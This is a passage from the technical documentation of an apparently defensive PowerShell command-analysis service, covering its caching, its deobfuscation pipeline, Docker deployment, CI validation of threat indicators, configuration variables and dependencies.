  "error": { "code": "QuotaExceededError", "message": "..." },
  "rate_limit_info": {
    "current_count": 11,
    "limit": 10,
    "window_seconds": 3600,
    "seconds_until_reset": 3599
  },
  "session_id": "uuid"
}
```

---

## Caching

The analysis cache reduces redundant processing:

1. **Hash generation**: CRC32 hash of the input command produces a `phash`.
2. **Cache lookup**: Before analysis, `check_cache(phash)` queries the `cache_results` table.
3. **Cache hit**: Returns stored `results_blob` and `ai_overview` immediately.
4. **Cache miss**: Full analysis runs, then `save_to_cache()` stores the result.
5. **Eviction**: Max 5 entries (FIFO - oldest removed on overflow).
6. **TTL**: 10 minutes (configurable via `CACHE_DURATION`).

Cached responses include `cache_info: { cached: true, cache_age_minutes: 3.2 }`.

---

## Deobfuscation Pipeline

Commands go through up to three layers of deobfuscation:

```
Input Command
     |
     v
[1] Base64 Decoding (if -EncodedCommand detected)
     |  - UTF-16-LE decoding
     |  - Double encoding detection
     v
[2] AST Service (synchronous, ~35s timeout)
     |  - 31 transformation passes
     |  - Static analysis only (no execution)
     |  - Returns deobfuscated command + techniques
     v
[3] LLM Deobfuscation (async, queued)
     |  - GPU-hosted Qwen model via RunPod
     |  - Handles complex/novel obfuscation
     |  - Background job with polling
     |  - Re-analyzed for new signatures
     v
Final Result (with all deobfuscation layers)
```

---

## Docker & Deployment

### docker-compose.yml

```yaml
services:
  ast-service:
    build: ./ast-service
    ports: ["8081:8081"]
    volumes:
      - ./ast-service/scripts:/app/scripts:ro
    environment:
      MAX_INPUT_LENGTH: 100000
      TIMEOUT_SECONDS: 30
      MAX_ITERATIONS: 10
      AST_API_KEY: ${AST_API_KEY:-avasero220949}
      PORT: 8081
    deploy:
      resources:
        limits:
          cpus: "2.0"
          memory: 1G
    networks: [ps-network]
    restart: unless-stopped

networks:
  ps-network:
```

### AST Service Dockerfile

- Base image: `mcr.microsoft.com/powershell:lts-ubuntu-22.04`
- Installs Pode module
- Health check: `curl http://localhost:8081/health` every 30s
- Resource limits: 2 CPUs, 1GB RAM

### Deployment Targets

| Platform   | Service        | Notes                          |
| ---------- | -------------- | ------------------------------ |
| **Vercel** | Frontend       | Primary frontend hosting       |
| **Docker** | AST Service    | Docker Compose orchestration   |
| **Render** | API + AST      | Alternative (render.yaml)      |
| **RunPod** | LLM            | GPU serverless for Qwen model  |
| **Supabase** | Database     | Managed PostgreSQL + Auth      |

---

## CI/CD Pipeline

### Indicator Validation (`.github/workflows/validate-indicators-pr.yml`)

Triggered on push to `main`/`master` when indicator files change:

| Step    | Name                  | Description                                       |
| ------- | --------------------- | ------------------------------------------------- |
| 1       | Detect Changes        | Identifies added/modified/deleted indicator files  |
| 2       | YAML Syntax           | Validates YAML structure (skips regex fields)      |
| 3       | Required Fields       | Ensures name, description, regex, basescore, tactic, technique, reference |
| 3.5     | Duplicate Detection   | Checks for duplicate names in repo and database    |
| 4       | Data Types            | Validates basescore (0-10), reference URL format   |
| 5       | Regex Compilation     | Compiles each regex to verify validity             |
| 6       | Database Update       | Upserts validated indicators to Supabase           |
| Final   | PR Summary            | Posts status comment on the pull request            |

---

## Configuration Reference

### API Environment Variables

| Variable                    | Default                        | Description                          |
| --------------------------- | ------------------------------ | ------------------------------------ |
| `SUPABASE_URL`              | -                              | Supabase project URL                 |
| `SUPABASE_SERVICE_ROLE_KEY` | -                              | Supabase service role token          |
| `SUPABASE_JWT_SECRET`       | -                              | JWT signing secret                   |
| `SUPABASE_ANON_KEY`         | -                              | Supabase anonymous key               |
| `AST_SERVICE_URL`           | `http://localhost:8081`        | AST service base URL                 |
| `AST_SERVICE_TIMEOUT`       | `35`                           | AST service request timeout (s)      |
| `AST_SERVICE_ENABLED`       | `true`                         | Toggle AST service integration       |
| `OPENAI_API_KEY`            | -                              | OpenAI API key for AI overviews      |
| `OPENAI_MODEL`              | `gpt-4o-mini`                  | OpenAI model                         |
| `OPENAI_MAX_TOKENS`         | `200`                          | Max tokens for AI overview           |
| `OPENAI_TIMEOUT`            | `10`                           | OpenAI API timeout (s)               |
| `RUNPOD_API_KEY`            | -                              | RunPod API key                       |
| `RUNPOD_ENDPOINT_ID`        | -                              | RunPod serverless endpoint           |
| `RUNPOD_ENABLED`            | `false`                        | Toggle RunPod LLM deobfuscation      |
| `RATE_LIMIT_REQUESTS`       | `5`                            | Per-session request limit            |
| `RATE_LIMIT_WINDOW`         | `60`                           | Rate limit window (s)                |
| `GLOBAL_RATE_LIMIT_REQUESTS`| `1000`                         | Global request limit                 |
| `CACHE_DURATION`            | `600000`                       | Cache TTL (ms)                       |

### Frontend Environment Variables

| Variable                       | Description                   |
| ------------------------------ | ----------------------------- |
| `NEXT_PUBLIC_API_URL`          | FastAPI backend URL            |
| `NEXT_PUBLIC_SUPABASE_URL`     | Supabase project URL           |
| `NEXT_PUBLIC_SUPABASE_ANON_KEY`| Supabase public (anon) key     |

---

## Dependencies

### Python (API)

| Package                   | Purpose                             |
| ------------------------- | ----------------------------------- |
| `fastapi`                 | Web framework                       |
| `uvicorn`                 | ASGI server                         |
| `supabase`                | Database client                     |
| `python-dotenv`           | Environment variable loading        |
| `aiohttp`                 | Async HTTP client                   |
| `python-jose[cryptography]` | JWT token handling               |
| `python-multipart`        | Multipart form parsing              |
| `pydantic`                | Request/response validation         |
| `regex`                   | Advanced regex engine               |
| `openai`                  | OpenAI API for AI overviews         |
| `stripe`                  | Payment processing (disabled)       |
| `python-Levenshtein`      | String similarity                   |

### Node.js (Frontend)

| Package                 | Purpose                               |
| ----------------------- | ------------------------------------- |
| `next@15`               | React framework (App Router)          |
| `react@19`              | UI library                            |
| `@supabase/supabase-js` | Database and auth client             |
| `react-icons`           | Icon library                          |
| `tailwindcss@4`         | Utility-first CSS                     |

### PowerShell (AST Service)

| Module         | Purpose                              |
| -------------- | ------------------------------------ |
| `Pode`         | HTTP server framework                |
| `PowerShell 7` | Runtime with AST parser              |
